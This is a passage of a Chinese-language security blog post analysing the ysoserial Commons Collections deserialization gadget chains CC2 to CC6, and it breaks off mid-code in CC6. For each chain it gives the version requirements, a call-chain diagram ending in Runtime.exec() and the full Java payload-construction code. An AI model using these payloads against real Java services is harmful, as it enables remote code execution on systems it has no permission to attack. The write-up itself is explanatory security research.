class="line"></span><br><span class="line">    <span class="comment">// 获取字节码</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置进入 defineTransletClasses() 的条件</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>); <span class="comment">// 必须填充</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance()); <span class="comment">// 可选</span></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><blockquote><p> 利用 TemplatesImpl 承载恶意调用链<br> PriorityQueue 在反序列化时比较元素（恢复顺序），而比较操作可以自定义<br> 利用 InvokerTransformer 构造比较操作，在比较时触发 transform 操作，进一步触发 TemplatesImpl</p></blockquote><p>适用版本</p><ul><li>commons-collections 4.0<ul><li>CommonsCollections1 可以在该版本复现，改为 <code>Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain);</code> 设置 factory</li></ul></li><li>jdk7u21<ul><li>使用 TemplatesImpl 的变量 <code>_bytecodes</code> 承载恶意字节码</li></ul></li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/rP7TSdGYfbiRmD2.png" ><p>ysoserial.payloads.CommonsCollections2 创建 PriorityQueue 对象，并将其 comparator 设置为包含恶意 transformer 对象的 TransformingComparator。</p><p>PriorityQueue 反序列化时最后会调用 <code>heapify -&gt; siftDown</code>（将无序队列还原为优先队列）， 当 comparator 不为空时进一步调用 <code>siftDownUsingComparator -&gt; conparator.compare</code>  最终通过调用 <code> transformer.transform(TemplatesImpl)</code>实现 RCE。</p><ul><li><code>PriorityQueue.heapify()</code> 用于构造二叉堆</li><li><code>InvokerTransformer.transform(TemplatesImpl) -&gt; TemplatesImpl.newTransformer()</code></li></ul><p>TemplatesImpl 类主要的作用为：</p><ul><li>使用 <code>_bytecodes</code> 成员变量存储恶意字节码 ( 恶意 class -&gt; byte array )</li><li>提供加载恶意字节码并触发执行的函数，加载在 <code>defineTransletClasses()</code> 方法中，方法触发为 <code>getOutputProperties()</code> 或 <code>newTransformer()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 假的方法名称 toString</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 transformer 构造 PriorityQueue</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 先设置正常的变量值</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改方法名称</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换队列内的变量</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates; <span class="comment">// jdk7u21</span></span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><blockquote><p>CC2(source) + CC1(sink)<br>利用 TemplatesImpl 承载恶意调用链<br>使用 InstantiateTransformer 代替 InvokerTransformer，通过 TrAXFilter 的构造方法调用 newTransformer<br>放在特性和 TransformedMap 相同的 lazyMap 中<br>通过动态代理 AnnotationInvocationHandler 的反序列化触发</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1</li><li>jdk7u21<ul><li>使用 <code>TemplatesImpl</code> 的变量 <code>_bytecodes</code> 承载恶意字节码</li></ul></li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                                Class.newInstance()</span><br><span class="line">                                    TrAXFilter#TrAXFilter()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                                        TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                            ClassLoader.defineClass()</span><br><span class="line">                                            Class.newInstance()</span><br><span class="line">                                              ...</span><br><span class="line">                                                MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                                ...</span><br><span class="line">                                                    Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/RNrPcWsiQm2Ak8G.png"><p>InstantiateTransformer 的 transform 方法会创建类实例。TrAXFilter 类的构造函数接受 Templates 类型的参数，并执行 <code>TemplatesImpl.newTransformer</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.CommonsCollections3#getObject 可以看出前面和 CC2 一样构造 templatesImpl 承载恶意代码，中间使用 InstantiateTransformer 构造链式触发器 ChainedTransformer，最后和 CC1 一样用 LazyMap 和 AnnotationInvocationHandler 动态代理封装。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImp 承载恶意代码</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同 CC1</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><blockquote><p>CC2 + CC3<br>利用 InstantiateTransformer 构造执行链</p></blockquote><p>适用版本</p><ul><li>commons-collections 4.0</li><li>jdk7u21<ul><li>使用 <code>TemplatesImpl</code> 的变量 <code>_bytecodes</code> 承载恶意字节码</li></ul></li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InstantiateTransformer.transform()</span><br><span class="line">                            Class.newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        ClassLoader.defineClass()</span><br><span class="line">                                        Class.newInstance()</span><br><span class="line">                                          ...</span><br><span class="line">                                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                            ...</span><br><span class="line">                                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/IkfLuarVRoy5Sni.png"><p>ysoserial.payloads.CommonsCollections4#getObject 用 ChainedTransformer 代替了 InvokerTransformer 作为比较器，且构造方式同 CC3，利用 InstantiateTransformer 触发。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="type">ConstantTransformer</span> <span class="variable">constant</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mock method name until armed</span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;;</span><br><span class="line">Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">paramTypes, args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// grab defensively copied arrays</span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create queue with numbers</span></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// swap in values to arm</span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><blockquote><p>前面 RMI 反序列化漏洞利用中提到<br>将 CC1 中的 AnnotationInvocationHandler 替换为 BadAttributeValueExpException<br>利用 CC1 中的 LazyMap 构造 TiedMapEntry，再用于构造 BadAttributeValueExpException</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1 ~ 3.2.1</li><li>jdk 1.8</li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/4tevUmukcFwMQT1.jpg" ><p>在 BadAttributeValueExpException 的 readObject 方法中，会调用成员变量 <code>val</code> 的 <code>toString</code> 方法</p><ul><li>这里将 <code>val</code> 设置为 TiedMapEntry</li><li>TiedMapEntry 会调用自身的 <code>getKey</code> 和 <code>getValue</code> 方法<ul><li><code>getKey</code> 方法中调用成员变量 map 的 <code>get</code> 方法</li><li>这里将 map 设置为 LazyMap（@CC1）</li></ul></li></ul><p>ysoserial.payloads.CommonsCollections5 注意这里利用反射设置 <code>val</code> 的值，因为 BadAttributeValueExpException 的构造函数会判断是否为空，如果不为空在序列化时就会执行 <code>toString()</code>，那么反序列化时，因为传入的 entry 已经是字符串，所以就不会触发 toString 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造恶意调用链 ChainedTransformer</span></span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 LazyMap，将其 factory 变量设置为 ChainedTransformer</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 LazyMap 构造 TiedMapEntry</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 BadAttributeValueExpException 的成员变量 val 设置为 TiedMapEntry</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    Reflections.setAccessible(valfield);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 ChainedTransformer 中的 transformer 数组替换为恶意调用序列</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><blockquote><p>CC5 + CC1<br>通过对 TiedMapEntry#getValue 的调用触发 LazyMap#get<br>利用 ChainedTransformer 构造链式执行</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1</li><li>jdk 1.7</li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        HashSet.readObject()</span><br><span class="line">            HashMap.put()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/jQaCHvLVX7IfBne.png" ><p>TiedMapEntry 中的 equals、hashCode、toString 方法中都调用了 TiedMapEntry#getValue，这里选择 hashCode 方法作为入口（CC5 用的是 toString）。</p><p>HashSet#readObject 反序列化时，会调用 map.put(e, PRESENT)方法，后续调用 HashMap#put，在其中会调用 HashMap#put 计算哈希值，最后触发 TiedMapEntry.hashCode；</p><p>map 可以控制为 HashMap，传入的第一个参数 e 是使用 readObject 读取，相应地在 writeObject 中写入的 e 是 map.keySet，因此通过反射修改 keySet 的返回结果为 TiedMapEntry。</p><p>ysoserial.payloads.CommonsCollections6#getObject 首先定义 ChainedTransformer 和 TiedMapEntry（同CC5），然后通过反射将 TiedMapEntry 赋值给 HashSet 的 keySet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Serializable <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造恶意调用链 ChainedTransformer</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title 